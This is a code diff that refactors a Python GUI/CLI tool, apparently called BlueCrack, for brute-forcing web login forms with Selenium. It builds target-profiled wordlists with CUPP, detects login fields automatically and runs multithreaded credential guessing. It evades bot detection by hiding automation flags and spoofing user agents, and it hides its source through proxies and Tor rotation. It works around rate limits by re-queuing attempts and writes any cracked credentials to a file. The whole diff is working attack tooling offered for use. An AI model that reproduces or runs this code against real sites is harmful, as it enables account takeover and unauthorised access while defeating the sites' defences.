+            QShortcut(QKeySequence("Ctrl+X"), self, activated=self._stop_attack)
+
+        # ── Helpers ──
+        def _pick_file(self, target: QLineEdit) -> None:
+            """Open a file dialog and set the selected file path into the target QLineEdit."""
             f, _ = QFileDialog.getOpenFileName(
                 self, "Open File", "", "Text Files (*.txt);;All Files (*)"
             )
             if f:
                 target.setText(f)
 
-        def _log(self, msg):
+        def _log(self, msg: str) -> None:
+            """Append a message to the log text area."""
             self.log_txt.append(msg)
 
+        def _toggle_theme(self) -> None:
+            """Toggle between dark and light themes."""
+            app_inst = QApplication.instance()
+            if app_inst is None:
+                return
+            if self._is_dark:
+                app_inst.setStyleSheet(LIGHT_STYLE)
+                self.theme_btn.setText("🌙")
+                self._is_dark = False
+            else:
+                app_inst.setStyleSheet(DARK_STYLE)
+                self.theme_btn.setText("☀")
+                self._is_dark = True
+
+        def _export_log(self) -> None:
+            """Export the current log contents to a timestamped file."""
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            filename = f"bluecrack_log_{timestamp}.txt"
+            try:
+                content = self.log_txt.toPlainText()
+                with open(filename, "w", encoding="utf-8") as f:
+                    f.write(content)
+                self._log(f"[+] Log exported to: {os.path.abspath(filename)}")
+                self.status_lbl.setText(f"Log exported: {filename}")
+            except Exception as e:
+                self._log(f"[-] Export failed: {e}")
+
+        def _update_elapsed(self) -> None:
+            """Update the elapsed time label (called by timer every second)."""
+            if self._attack_start_time > 0:
+                elapsed = time.time() - self._attack_start_time
+                h, rem = divmod(int(elapsed), 3600)
+                m, s = divmod(rem, 60)
+                self.elapsed_val.setText(f"{h:02d}:{m:02d}:{s:02d}")
+
+                attempted = self._current_metrics.get("attempted", 0)
+                if elapsed > 0 and attempted > 0:
+                    rate = attempted / elapsed
+                    self.speed_val.setText(f"{rate:.1f}/s")
+
+                    remaining = self._total_combos - attempted
+                    if rate > 0 and remaining > 0:
+                        eta_sec = remaining / rate
+                        eh, erem = divmod(int(eta_sec), 3600)
+                        em, es = divmod(erem, 60)
+                        self.eta_val.setText(f"{eh:02d}:{em:02d}:{es:02d}")
+                    elif remaining <= 0:
+                        self.eta_val.setText("00:00:00")
+
+        def _on_metrics(self, metrics: Dict[str, Any]) -> None:
+            """Handle metrics signal from the worker thread."""
+            self._current_metrics = metrics
+            self.hits_val.setText(str(metrics.get("successes", 0)))
+
         # ── CUPP ──
-        def _run_cupp(self):
+        def _run_cupp(self) -> None:
+            """Launch a CUPP wordlist generation in a background thread."""
             name = self.cupp_name.text().strip()
             if not name:
                 QMessageBox.warning(self, "CUPP", "First Name is required.")
                 return
-            profile = {
+            profile: Dict[str, Any] = {
                 "name": name.lower(),
                 "surname": self.cupp_surname.text().strip().lower(),
                 "nick": self.cupp_nick.text().strip().lower(),
@@ -1047,7 +1903,9 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
                 "pet": self.cupp_pet.text().strip().lower(),
                 "company": self.cupp_company.text().strip().lower(),
                 "words": [
-                    w.strip() for w in self.cupp_keywords.text().split(",") if w.strip()
+                    w.strip()
+                    for w in self.cupp_keywords.text().split(",")
+                    if w.strip()
                 ]
                 or [""],
                 "spechars1": "y" if self.cupp_specchars.isChecked() else "n",
@@ -1061,7 +1919,8 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
             self._cupp_thread.finished_signal.connect(self._cupp_done)
             self._cupp_thread.start()
 
-        def _cupp_done(self, path):
+        def _cupp_done(self, path: str) -> None:
+            """Handle CUPP generation completion."""
             self.cupp_gen_btn.setEnabled(True)
             self.cupp_gen_btn.setText("🧠  Generate CUPP Profile")
             self._cupp_result_path = path
@@ -1069,7 +1928,8 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
                 self.cupp_use_btn.setEnabled(True)
                 self.status_lbl.setText(f"CUPP wordlist: {path}")
 
-        def _run_sequence(self):
+        def _run_sequence(self) -> None:
+            """Generate a numeric sequence wordlist."""
             prefix = self.seq_prefix.text()
             suffix = self.seq_suffix.text()
             start = self.seq_start.value()
@@ -1106,14 +1966,16 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
                 self.seq_gen_btn.setEnabled(True)
                 self.seq_gen_btn.setText("🔢  Generate Sequence")
 
-        def _use_cupp_result(self):
+        def _use_cupp_result(self) -> None:
+            """Copy the CUPP result path to the password input field."""
             if self._cupp_result_path:
                 self.pass_in.setText(self._cupp_result_path)
                 self.tabs.setCurrentIndex(0)
                 self._log(f"[+] Password list set to: {self._cupp_result_path}")
 
         # ── Attack ──
-        def _start_attack(self):
+        def _start_attack(self) -> None:
+            """Validate inputs and launch the attack worker thread."""
             url = self.url_in.text().strip()
             if not url:
                 QMessageBox.critical(self, "Error", "Enter a Target URL.")
@@ -1122,7 +1984,7 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
                 url = "http://" + url
 
             up = self.user_in.text().strip()
-            users = []
+            users: List[str] = []
             if os.path.isfile(up):
                 with open(up, encoding="utf-8", errors="ignore") as f:
                     users = [x.strip() for x in f if x.strip()]
@@ -1130,7 +1992,7 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
                 users = [up]
 
             pp = self.pass_in.text().strip()
-            passwords = []
+            passwords: List[str] = []
             if os.path.isfile(pp):
                 with open(pp, encoding="utf-8", errors="ignore") as f:
                     passwords = [x.strip() for x in f if x.strip()]
@@ -1143,7 +2005,7 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
                 )
                 return
 
-            proxies_list = []
+            proxies_list: List[str] = []
             px = self.proxy_in.text().strip()
             if os.path.isfile(px):
                 with open(px, encoding="utf-8", errors="ignore") as f:
@@ -1151,7 +2013,7 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
             elif px:
                 proxies_list = [px]
 
-            ctx = {
+            ctx: Dict[str, Any] = {
                 "target_url": url,
                 "users": users,
                 "passwords": passwords,
@@ -1166,11 +2028,16 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
                 "use_tor": self.tor_cb.isChecked(),
                 "tor_port": self.tor_port_in.value(),
                 "tor_shift_every": self.tor_every_in.value(),
+                "success_msg": self.success_in.text().strip(),
+                "max_attempts": self.max_attempts_in.value(),
+                "continue_after_success": self.continue_cb.isChecked(),
             }
 
             total = len(users) * len(passwords)
+            self._total_combos = total
             self.progress.setMaximum(total)
             self.progress.setValue(0)
+            self.progress.setStyleSheet("")  # Reset any custom style
             self.log_txt.clear()
             self._log(f"[*] Target: {url}")
             self._log(
@@ -1179,38 +2046,70 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
             self._log(
                 f"[*] Threads: {ctx['threads']}   Tor: {'ON' if ctx['use_tor'] else 'OFF'}"
             )
+            if ctx["success_msg"]:
+                self._log(f"[*] Success text: '{ctx['success_msg']}'")
+            if ctx["max_attempts"] > 0:
+                self._log(f"[*] Max attempts: {ctx['max_attempts']}")
+
             self.start_btn.setEnabled(False)
             self.stop_btn.setEnabled(True)
             self.status_lbl.setText("Running...")
+
+            # Reset footer stats
+            self._attack_start_time = time.time()
+            self._current_metrics = {}
+            self.elapsed_val.setText("00:00:00")
+            self.speed_val.setText("0.0/s")
+            self.eta_val.setText("--:--:--")
+            self.hits_val.setText("0")
+            self._stats_timer.start()
 
             self.worker_thread = GuiWorkerThread(ctx)
             self.worker_thread.log_signal.connect(self._log)
             self.worker_thread.progress_signal.connect(self._on_progress)
             self.worker_thread.finished_signal.connect(self._on_finished)
+            self.worker_thread.metrics_signal.connect(self._on_metrics)
             self.worker_thread.start()
 
-        def _stop_attack(self):
+        def _stop_attack(self) -> None:
+            """Request the worker thread to stop."""
             if self.worker_thread and self.worker_thread.isRunning():
                 self._log("[!] Stop requested — finishing current attempts...")
                 self.worker_thread.request_stop()
                 self.status_lbl.setText("Stopping...")
 
-        def _on_progress(self, cur, total):
+        def _on_progress(self, cur: int, total: int) -> None:
+            """Update the progress bar."""
             self.progress.setValue(cur)
             self.status_lbl.setText(f"Progress: {cur}/{total}")
 
-        def _on_finished(self, found, msg):
+        def _on_finished(self, found: bool, msg: str) -> None:
+            """Handle attack completion."""
+            self._stats_timer.stop()
             self.start_btn.setEnabled(True)
             self.stop_btn.setEnabled(False)
             self.status_lbl.setText(msg)
+
+            # Final elapsed update
+            if self._attack_start_time > 0:
+                elapsed = time.time() - self._attack_start_time
+                h, rem = divmod(int(elapsed), 3600)
+                m, s = divmod(rem, 60)
+                self.elapsed_val.setText(f"{h:02d}:{m:02d}:{s:02d}")
+                self.eta_val.setText("00:00:00")
+
             if found:
                 self.progress.setStyleSheet(
-                    "QProgressBar::chunk{background:#238636; border-radius:5px;}"
+                    "QProgressBar::chunk { background: qlineargradient("
+                    "x1:0,y1:0,x2:1,y2:0, stop:0 #00e676, stop:1 #00c853);"
+                    " border-radius: 9px; }"
                 )
                 QMessageBox.information(self, "Success", msg)
             else:
                 self.progress.setStyleSheet(
-                    "QProgressBar::chunk{background:#da3633; border-radius:5px;}"
+                    "QProgressBar::chunk { background: qlineargradient("
+                    "x1:0,y1:0,x2:1,y2:0, stop:0 #ff5252, stop:1 #d32f2f);"
+                    " border-radius: 9px; }"
                 )
                 QMessageBox.warning(self, "Finished", msg)
 
@@ -1222,11 +2121,14 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
     win.show()
     sys.exit(app.exec())
     # GUI mode exits here — CLI code below never runs
+
+# ═══════════════════════════════════════════════════════════════════
+# ██  CLI MODE  ██
 # ═══════════════════════════════════════════════════════════════════
 
 # INTERACTIVE MODE
 if args.interactive:
-    print("\n\033[36m--- WIZARD MODE ---\033[0m")
+    print(f"\n{_CYAN}--- WIZARD MODE ---{_RESET}")
 
     # CUPP Integration
     run_cupp = (
@@ -1237,15 +2139,15 @@ if args.interactive:
     )
     if run_cupp:
         print(
-            "\n\033[33m--- LAUNCHING CUPP (Common User Passwords Profiler) ---\033[0m"
+            f"\n{_YELLOW}--- LAUNCHING CUPP (Common User Passwords Profiler) ---{_RESET}"
         )
         if os.path.exists("cupp.py"):
             os.system(f"{sys.executable} cupp.py -i")
             print(
-                "\n\033[32m[+] CUPP completed! Make sure to remember the saved filename.\033[0m\n"
+                f"\n{_GREEN}[+] CUPP completed! Make sure to remember the saved filename.{_RESET}\n"
             )
         else:
-            print("\n❌ cupp.py not found in the directory. Skipping...\n")
+            print(f"\n{_RED}❌ cupp.py not found in the directory. Skipping...{_RESET}\n")
 
     args.url = input("\nEnter Target URL: ").strip()
     args.username = (
@@ -1263,26 +2165,30 @@ if args.interactive:
         args.password = None
         args.passfile = input("Enter path to passwords list file: ").strip() or None
 
-    threads_in = input("Enter number of threads [default: 1]: ").strip()
-    args.threads = int(threads_in) if threads_in.isdigit() else 1
+    threads_in_str = input("Enter number of threads [default: 1]: ").strip()
+    args.threads = int(threads_in_str) if threads_in_str.isdigit() else 1
 
-    err_in = input("Enter error string to check (default: empty): ").strip()
-    if err_in:
-        args.error = err_in
+    err_in_str = input("Enter error string to check (default: empty): ").strip()
+    if err_in_str:
+        args.error = err_in_str
 
-    succ_in = input("Enter success string to check (default: empty): ").strip()
-    if succ_in:
-        args.success = succ_in
+    succ_in_str = input("Enter success string to check (default: empty): ").strip()
+    if succ_in_str:
+        args.success = succ_in_str
 
-    delay_in = input(
+    delay_in_str = input(
         "Enter general delay between attempts in seconds [default: 0]: "
     ).strip()
-    args.delay = float(delay_in) if delay_in.replace(".", "", 1).isdigit() else 0.0
+    args.delay = (
+        float(delay_in_str) if delay_in_str.replace(".", "", 1).isdigit() else 0.0
+    )
 
-    jitter_in = input(
+    jitter_in_str = input(
         "Enter jitter/randomizer up to X seconds [default: 0.0]: "
     ).strip()
-    args.jitter = float(jitter_in) if jitter_in.replace(".", "", 1).isdigit() else 0.0
+    args.jitter = (
+        float(jitter_in_str) if jitter_in_str.replace(".", "", 1).isdigit() else 0.0
+    )
 
     use_proxy = input("Use proxy? (y/n) [default: n]: ").strip().lower() == "y"
     if use_proxy:
@@ -1310,6 +2216,14 @@ if args.interactive:
         if rl_text:
             args.limit_text = rl_text
 
+    max_att_str = input("Max attempts (0=unlimited) [default: 0]: ").strip()
+    args.max_attempts = int(max_att_str) if max_att_str.isdigit() else 0
+
+    cont_str = input(
+        "Continue testing after finding credentials? (y/n) [default: n]: "
+    ).strip().lower()
+    args.continue_after_success = cont_str == "y"
+
     auto_detect = (
         input("Auto-detect CSS selectors instead of clicking? (y/n) [default: y]: ")
         .strip()
@@ -1319,16 +2233,16 @@ if args.interactive:
 else:
     auto_detect = False
     if not args.url:
-        raise SystemExit("❌ Provide --url or use -i wizard")
+        raise SystemExit(f"{_RED}❌ Provide --url or use -i wizard{_RESET}")
 
 if not args.username and not args.userfile:
-    raise SystemExit("❌ Provide -u USER or -U USERFILE")
+    raise SystemExit(f"{_RED}❌ Provide -u USER or -U USERFILE{_RESET}")
 
 if not args.password and not args.passfile:
-    raise SystemExit("❌ Provide -p PASS or -P PASSLIST")
+    raise SystemExit(f"{_RED}❌ Provide -p PASS or -P PASSLIST{_RESET}")
 
 # LOAD USERNAMES
-users = []
+users: List[str] = []
 
 if args.username:
     users.append(args.username)
@@ -1337,8 +2251,9 @@ if args.userfile:
     with open(args.userfile, "r", encoding="utf-8", errors="ignore") as f:
         for line in f:
             users.append(line.strip())
+
 # LOAD PASSWORDS
-passwords = []
+passwords: List[str] = []
 
 if args.password:
     passwords.append(args.password)
@@ -1351,7 +2266,7 @@ if args.passfile:
                 passwords.append(px)
 
 # LOAD PROXIES
-proxies = []
+proxies: List[str] = []
 if args.proxy:
     proxies.append(args.proxy)
 if args.proxyfile:
@@ -1360,38 +2275,41 @@ if args.proxyfile:
             if line.strip():
                 proxies.append(line.strip())
 
-USERNAME_FIXED = users[0] if len(users) == 1 else None
-USERLIST = users if len(users) > 1 else None
+USERNAME_FIXED: Optional[str] = users[0] if len(users) == 1 else None
+USERLIST: Optional[List[str]] = users if len(users) > 1 else None
 
-PASSWORD_FIXED = passwords[0] if len(passwords) == 1 else None
-PASSLIST = passwords if len(passwords) > 1 else None
-WORDLIST = f"{len(passwords)} passwords loaded for {len(users)} users"
-PROXY_INFO = f"{len(proxies)} proxies loaded" if proxies else "No Proxies"
+PASSWORD_FIXED: Optional[str] = passwords[0] if len(passwords) == 1 else None
+PASSLIST: Optional[List[str]] = passwords if len(passwords) > 1 else None
+WORDLIST: str = f"{len(passwords)} passwords loaded for {len(users)} users"
+PROXY_INFO: str = f"{len(proxies)} proxies loaded" if proxies else "No Proxies"
 
-THREADS = args.threads
-TARGET_URL = args.url
+THREADS: int = args.threads
+TARGET_URL: str = args.url
 if (
     TARGET_URL
     and not TARGET_URL.startswith("http://")
     and not TARGET_URL.startswith("https://")
 ):
     TARGET_URL = "http://" + TARGET_URL
-ERROR_MSG = args.error.lower() if args.error else None
-SUCCESS_MSG = args.success.lower() if args.success else None
-LIMIT_TEXT = args.limit_text.lower() if args.limit_text else None
-COOLDOWN = args.cooldown
-DELAY = args.delay
-JITTER = args.jitter
-RUN_HEADLESS = args.headless
+ERROR_MSG: Optional[str] = args.error.lower() if args.error else None
+SUCCESS_MSG: Optional[str] = args.success.lower() if args.success else None
+LIMIT_TEXT: Optional[str] = args.limit_text.lower() if args.limit_text else None
+COOLDOWN: int = args.cooldown
+DELAY: float = args.delay
+JITTER: float = args.jitter
+RUN_HEADLESS: bool = args.headless
+MAX_ATTEMPTS: int = args.max_attempts
+CONTINUE_AFTER_SUCCESS: bool = args.continue_after_success
+OUTPUT_FILE: str = args.output
+JSON_REPORT: bool = args.json_report
 
-
-# LAUNCH SELENIUM
+# LAUNCH SELENIUM (setup browser)
 driver = webdriver.Chrome()
 driver.get(TARGET_URL)
 
-username_selector = None
-password_selector = None
-submit_selector = None
+username_selector: Optional[str] = None
+password_selector: Optional[str] = None
+submit_selector: Optional[str] = None
 
 print("\n==============================")
 print("🔥 BROWSER BRUTE TESTER 🔥")
@@ -1402,128 +2320,99 @@ print(f"Wordlist: {WORDLIST}")
 print(f"Proxies: {PROXY_INFO}")
 print(f"Threads: {THREADS}")
 print(f"Delay/Jitter: {DELAY}s / {JITTER}s")
+if MAX_ATTEMPTS > 0:
+    print(f"Max Attempts: {MAX_ATTEMPTS}")
+if CONTINUE_AFTER_SUCCESS:
+    print(f"{_CYAN}[*] Will continue after finding credentials{_RESET}")
+
 # Inject JS to track last clicked element
-driver.execute_script(
-    """
-document.addEventListener('click', function(e) {
-    window._lastClicked = e.target;
-});
-"""
-)
+driver.execute_script(CLICK_LISTENER_JS)
+
 
 # GENERATE CSS SELECTOR FROM CLICKED ELEMENT
-def get_css_selector():
+def get_css_selector() -> Optional[str]:
+    """Get the CSS selector of the last clicked element in the setup browser.
+
+    Returns:
+        CSS selector string or None if no element was clicked.
+    """
     elem = driver.execute_script("return window._lastClicked")
     if elem is None:
         return None
-    return driver.execute_script(
-        """
-    function cssPath(el){
-        if (!el) return null;
-        var path = [];
-        while (el.nodeType === Node.ELEMENT_NODE){
-            var selector = el.nodeName.toLowerCase();
-            if (el.id){
-                selector += "#" + el.id;
-                path.unshift(selector);
-                break;
-            } else {
-                var sib = el, nth = 1;
-                while(sib = sib.previousElementSibling){
-                    if (sib.nodeName.toLowerCase() == selector)
-                        nth++;
-                }
-                if (nth != 1)
-                    selector += ":nth-of-type("+nth+")";
-            }
-            path.unshift(selector);
-            el = el.parentNode;
-        }
-        return path.join(" > ");
-    }
-    return cssPath(arguments[0]);
-    """,
-        elem,
-    )
+    return driver.execute_script(CSS_PATH_JS, elem)
 
 
 if auto_detect:
-    print("\n🔍 Auto-detecting login form fields...")
-    time.sleep(2)  # Let page load completely
+    print(f"\n{_CYAN}🔍 Auto-detecting login form fields...{_RESET}")
+    time.sleep(2)
     try:
-        # Passwords usually have type "password"
-        # Usernames are usually the element right before the password or type="text"/"email"
-        driver.execute_script(
-            """
-            window._autoFindFields = function() {
-                let passwordField = document.querySelector('input[type="password"]');
-                let userField = null;
-                
-                if (passwordField) {
-                    // Look for preceding text/email inputs in the same form
-                    let inputs = Array.from(passwordField.form ? passwordField.form.querySelectorAll('input') : document.querySelectorAll('input'));
-                    for (let el of inputs) {
-                        if ((el.type === 'text' || el.type === 'email' || el.name.includes('user')) && el !== passwordField) {
-                            userField = el;
-                            break;
-                        }
-                    }
-                }
-                
-                // Fallback basic CSS
-                let ucss = userField ? userField.tagName.toLowerCase() + (userField.id ? '#'+userField.id : (userField.name ? '[name="'+userField.name+'"]' : '')) : null;
-                let pcss = passwordField ? passwordField.tagName.toLowerCase() + (passwordField.id ? '#'+passwordField.id : (passwordField.name ? '[name="'+passwordField.name+'"]' : '')) : null;
-                
-                return [ucss, pcss];
-            };
-        """
-        )
-
+        driver.execute_script(AUTO_DETECT_JS)
         detected_selectors = driver.execute_script("return window._autoFindFields();")
         if detected_selectors and detected_selectors[0] and detected_selectors[1]:
             username_selector, password_selector = detected_selectors
-            print(f"✅ AUTO-DETECTED Username: {username_selector}")
-            print(f"✅ AUTO-DETECTED Password: {password_selector}")
+            print(f"{_GREEN}✅ AUTO-DETECTED Username: {username_selector}{_RESET}")
+            print(f"{_GREEN}✅ AUTO-DETECTED Password: {password_selector}{_RESET}")
         else:
-            print("❌ Courier auto-detect failed. Please lock manually.")
+            print(f"{_RED}❌ Auto-detect failed. Please lock manually.{_RESET}")
             auto_detect = False
     except Exception as e:
-        print(f"❌ Auto-detect script failed: {e}. Switching to manual mode.")
+        print(
+            f"{_RED}❌ Auto-detect script failed: {e}. Switching to manual mode.{_RESET}"
+        )
         auto_detect = False
 
 # WAIT FOR USER TO LOCK FIELDS
 if not auto_detect:
-    print("\n👉 CLICK username field → press S")
-    print("👉 CLICK password field → press T")
-    print("👉 Press ENTER to start brute\n")
+    print(f"\n{_CYAN}👉 CLICK username field → press S{_RESET}")
+    print(f"{_CYAN}👉 CLICK password field → press T{_RESET}")
+    print(f"{_CYAN}👉 Press ENTER to start brute{_RESET}\n")
 
 while username_selector is None or password_selector is None:
     if keyboard.is_pressed("s"):
         css = get_css_selector()
         if css:
             username_selector = css
-            print(f"🔵 Username selector LOCKED: {css}")
+            print(f"{_BLUE}🔵 Username selector LOCKED: {css}{_RESET}")
         time.sleep(0.3)
     if keyboard.is_pressed("t"):
         css = get_css_selector()
         if css:
             password_selector = css
-            print(f"🟣 Password selector LOCKED: {css}")
+            print(f"{_BLUE}🟣 Password selector LOCKED: {css}{_RESET}")
         time.sleep(0.3)
 
 print("\nSelectors locked! Press ENTER to launch brute...")
 
-# TEST THE SELECTORS IMMEDIATELY (fix)
+# TEST THE SELECTORS IMMEDIATELY
 driver.find_element(By.CSS_SELECTOR, username_selector)
 driver.find_element(By.CSS_SELECTOR, password_selector)
 
 keyboard.wait("enter")
 
-# LOAD WORDLIST
-q = Queue(maxsize=1000)
+# LOAD WORDLIST INTO QUEUE
+q: Queue = Queue(maxsize=1000)
+total_combos: int = len(users) * len(passwords)
+
+# CLI metrics
+_cli_metrics: Dict[str, int] = {
+    "attempted": 0,
+    "successes": 0,
+    "failures": 0,
+    "errors": 0,
+    "rate_limit_hits": 0,
+    "skipped_empty": 0,
+    "requeued": 0,
+}
+_cli_metrics_lock = threading.Lock()
+_cli_found_creds: List[Tuple[str, str]] = []
+_cli_found_creds_lock = threading.Lock()
+_cli_found_users: Set[str] = set()
+_cli_found_users_lock = threading.Lock()
+_cli_start_time: float = time.time()
 
 
-def populate():
+def populate() -> None:
+    """Populate the work queue with (user, password) combos."""
     for user in users:
         for pwd in passwords:
             q.put((user, pwd))
@@ -1531,81 +2420,77 @@ def populate():
 
 threading.Thread(target=populate, daemon=True).start()
 
-found = False
 
 # WORKER FUNCTION
-def worker():
-    global found
+def worker() -> None:
+    """CLI worker function — runs in a thread, tests credentials via Selenium."""
+    global total_combos
 
-    # Initialize a new webdriver for each thread
-    options = webdriver.ChromeOptions()
+    ctx: Dict[str, Any] = {
+        "headless": RUN_HEADLESS,
+        "proxies": proxies,
+        "use_tor": False,
+    }
+    options = build_chrome_options(ctx)
 
-    # STEALTH: Remove webdriver flag to bypass basic bot protection
-    options.add_experimental_option("excludeSwitches", ["enable-automation"])
-    options.add_experimental_option("useAutomationExtension", False)
-    options.add_argument("--disable-blink-features=AutomationControlled")
-
-    # Spoof User Agent randomly
-    USER_AGENTS = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    ]
-    options.add_argument(f"user-agent={random.choice(USER_AGENTS)}")
-
-    # Optional Proxy Rotation
-    if proxies:
-        proxy = random.choice(proxies)
-        options.add_argument(f"--proxy-server={proxy}")
-
-    if RUN_HEADLESS:
-        options.add_argument("--headless=new")
-        options.add_argument("--disable-gpu")
-        options.add_argument("--window-size=1920x1080")
-
-    try:
-        thread_driver = webdriver.Chrome(options=options)
-    except Exception as e:
-        print(f"[-] Thread initialization failed: {e}")
+    thread_driver = create_driver_safe(options)
+    if thread_driver is None:
+        print(f"{_RED}[-] Thread initialization failed: could not create WebDriver{_RESET}")
         return
 
     try:
-        while not q.empty() and not found and not _GLOBAL_STOP.is_set():
+        while not q.empty() and not _FOUND_EVENT.is_set() and not _GLOBAL_STOP.is_set():
+            # Check max attempts
+            if MAX_ATTEMPTS > 0:
+                with _cli_metrics_lock:
+                    if _cli_metrics["attempted"] >= MAX_ATTEMPTS:
+                        break
+
+            # Check if we should stop (non-continue mode)
+            if not CONTINUE_AFTER_SUCCESS and _FOUND_EVENT.is_set():
+                break
+
             user, pwd = q.get()
 
-            # Skip empty passwords (especially artifacts from CUPP generation)
+            # Skip empty passwords
             if not pwd or str(pwd).strip() == "":
+                with _cli_metrics_lock:
+                    _cli_metrics["skipped_empty"] += 1
                 q.task_done()
                 continue
 
+            # Skip already solved users (unless continue mode)
+            if not CONTINUE_AFTER_SUCCESS:
+                with _cli_found_users_lock:
+                    if user in _cli_found_users:
+                        q.task_done()
+                        continue
+
             try:
-                # Break early if another thread already found the password
-                if found or _GLOBAL_STOP.is_set():
+                if _FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS:
+                    break
+                if _GLOBAL_STOP.is_set():
                     break
 
                 # Add delay if configured
-                actual_delay = DELAY
+                actual_delay: float = DELAY
                 if JITTER > 0.0:
                     actual_delay += random.uniform(0, JITTER)
 
                 if actual_delay > 0.0:
-                    for _ in range(
-                        int(actual_delay * 10)
-                    ):  # sleep in small chunks so we can break early
-                        if found:
+                    for _ in range(int(actual_delay * 10)):
+                        if _FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS:
                             break
                         time.sleep(0.1)
 
-                if found:
+                if (_FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS) or _GLOBAL_STOP.is_set():
                     break
 
                 thread_driver.get(TARGET_URL)
-                if found:
+                if (_FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS) or _GLOBAL_STOP.is_set():
                     break
 
                 try:
-
                     u = thread_driver.find_element(By.CSS_SELECTOR, username_selector)
                     p = thread_driver.find_element(By.CSS_SELECTOR, password_selector)
                     u.clear()
@@ -1614,128 +2499,176 @@ def worker():
                     p.send_keys(pwd)
                     p.send_keys(Keys.ENTER)
 
-                    if found:
+                    with _cli_metrics_lock:
+                        _cli_metrics["attempted"] += 1
+                        attempt_num = _cli_metrics["attempted"]
+
+                    if (_FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS) or _GLOBAL_STOP.is_set():
                         break
 
-                    print(f"[*] Trying: {user} / {pwd}")
+                    print(
+                        f"[{attempt_num}/{total_combos}] {_CYAN}[*]{_RESET} Trying: {user} / {pwd}"
+                    )
 
-                    # Wait for login to process, check periodically
+                    # Wait for login to process
                     for _ in range(20):
-                        if found:
+                        if _FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS:
                             break
                         time.sleep(0.1)
 
-                    if found:
+                    if (_FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS) or _GLOBAL_STOP.is_set():
                         break
 
-                    # Check error message
-                    page_source = thread_driver.page_source.lower()
-                    current_url = thread_driver.current_url
+                    # Check page
+                    page_source: str = thread_driver.page_source.lower()
+                    current_url: str = thread_driver.current_url
 
                     # Check for rate limiting first
                     if LIMIT_TEXT and LIMIT_TEXT in page_source:
                         print(
-                            f"[\033[33m!\033[0m] Rate Limit detected ('{LIMIT_TEXT}')!"
+                            f"[{attempt_num}/{total_combos}] {_YELLOW}[!] Rate Limit detected ('{LIMIT_TEXT}')!{_RESET}"
                         )
+                        with _cli_metrics_lock:
+                            _cli_metrics["rate_limit_hits"] += 1
                         if COOLDOWN > 0:
                             print(
-                                f"[\033[36m~\033[0m] Bypassing... Sleeping {COOLDOWN} seconds before retrying {user}/{pwd}"
+                                f"{_CYAN}[~] Bypassing... Sleeping {COOLDOWN} seconds before retrying {user}/{pwd}{_RESET}"
                             )
-                            # sleep in small steps to break early if another thread solves it
                             for _ in range(COOLDOWN * 10):
-                                if found:
+                                if _FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS:
                                     break
                                 time.sleep(0.1)
-                            if not found:
-                                q.put(
-                                    (user, pwd)
-                                )  # Put the exact combo back in the queue to try again
+                            if not _FOUND_EVENT.is_set() or CONTINUE_AFTER_SUCCESS:
+                                q.put((user, pwd))
+                                with _cli_metrics_lock:
+                                    _cli_metrics["requeued"] += 1
                         else:
-                            print(f"[-] Rate limit hit, skipping {user}/{pwd}...")
+                            print(
+                                f"{_RED}[-] Rate limit hit, skipping {user}/{pwd}...{_RESET}"
+                            )
                         continue
 
-                    # First check if the page actually contains our explicit fail phrase
+                    # Check explicit error
                     if ERROR_MSG and ERROR_MSG in page_source:
-                        # It explicitly failed
+                        with _cli_metrics_lock:
+                            _cli_metrics["failures"] += 1
                         continue
 
-                    # If success string is defined, explicitly check it
+                    # Determine success
+                    is_success = False
                     if SUCCESS_MSG:
-                        if SUCCESS_MSG not in page_source:
-                            # Not found explicit success
-                            continue
+                        if SUCCESS_MSG in page_source:
+                            is_success = True
                         else:
-                            pass # We found success!
-                    
-                    # Also consider a win if the URL changed to a non-login page and no error found
+                            with _cli_metrics_lock:
+                                _cli_metrics["failures"] += 1
+                            continue
                     elif current_url != TARGET_URL and "login" not in current_url.lower():
-                        pass # Redirected away from login forms!
+                        is_success = True
                     elif ERROR_MSG:
-                        pass # Valid by elimination
+                        is_success = True
 
-                    # If we got here, the explicit fail message is missing.
-                    # It might be a win. Alternatively, check if URL changed to something unexpected.
-                    if not found:
-                        print(f"\n[+] 🔥🔥 VALID CREDENTIALS FOUND: {user} / {pwd} 🔥🔥\n")
+                    if is_success:
+                        print(
+                            f"\n{_GREEN}{_BOLD}[+] 🔥🔥 VALID CREDENTIALS FOUND: {user} / {pwd} 🔥🔥{_RESET}\n"
+                        )
+                        with _cli_metrics_lock:
+                            _cli_metrics["successes"] += 1
+                        with _cli_found_creds_lock:
+                            _cli_found_creds.append((user, pwd))
+                        with _cli_found_users_lock:
+                            _cli_found_users.add(user)
+
                         try:
-                            with open("credentials.txt", "a", encoding="utf-8") as cf:
+                            with open(OUTPUT_FILE, "a", encoding="utf-8") as cf:
                                 cf.write(f"{TARGET_URL} - {user}:{pwd}\n")
                         except Exception as e:
-                            print(f"[-] Could not save credential: {e}")
-                        found = True
